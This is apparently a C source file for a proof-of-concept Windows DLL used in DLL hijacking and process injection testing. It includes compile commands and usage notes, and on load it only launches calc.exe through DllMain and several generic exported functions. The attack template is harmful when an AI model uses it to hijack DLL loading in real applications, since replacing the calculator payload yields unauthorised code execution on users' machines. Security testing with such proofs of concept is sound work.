/*
 * DLL Payload — Pop calc.exe (Proof of Code Execution)
 *
 * Compile (MinGW):
 *   x86_64-w64-mingw32-gcc -shared -o calc.dll dll_calc.c
 *   i686-w64-mingw32-gcc -shared -o calc32.dll dll_calc.c    (32-bit)
 *
 * Compile (MSVC):
 *   cl /LD dll_calc.c /Fe:calc.dll
 *
 * Usage:
 *   - Place in application directory for DLL hijack testing
 *   - Use with rundll32: rundll32.exe calc.dll,DllMain
 *   - Load via process injection
 */

#include <windows.h>
#include <stdlib.h>

#pragma comment(lib, "user32.lib")

// Export functions commonly expected by applications
__declspec(dllexport) void Run(void) {
    WinExec("calc.exe", SW_SHOW);
}

__declspec(dllexport) void Execute(void) {
    WinExec("calc.exe", SW_SHOW);
}

__declspec(dllexport) void Init(void) {
    WinExec("calc.exe", SW_SHOW);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        WinExec("calc.exe", SW_SHOW);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
